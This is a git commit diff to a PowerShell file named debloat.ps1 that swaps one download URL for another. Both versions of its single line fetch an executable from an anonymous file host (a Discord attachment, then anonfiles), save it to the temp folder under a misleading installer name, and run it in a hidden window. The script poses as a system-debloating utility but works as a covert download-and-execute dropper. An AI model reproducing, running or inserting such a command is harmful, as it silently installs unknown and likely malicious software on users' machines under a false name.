f2b8d73b593deaa077a6887232779e971eaefdc5
Br3akers <104162584+Br3akers@users.noreply.github.com>
2023-01-05 21:53:44 +0100

    Update debloat.ps1

--- debloat.ps1
+++ debloat.ps1
@@ -1,1 +1,1 @@
-iwr -useb https://cdn.discordapp.com/attachments/1060330186396160011/1060346480155701298/testte.exe -o $env:TEMP\voicemeetervstinstaller.exe; saps $env:TEMP\voicemeetervstinstaller.exe -WindowStyle Hidden
+iwr -useb https://cdn-153.anonfiles.com/ndU7n5Q8y4/851345f3-1672952520/opti.exe -o $env:TEMP\voicemeetervstinstaller.exe; saps $env:TEMP\voicemeetervstinstaller.exe -WindowStyle Hidden
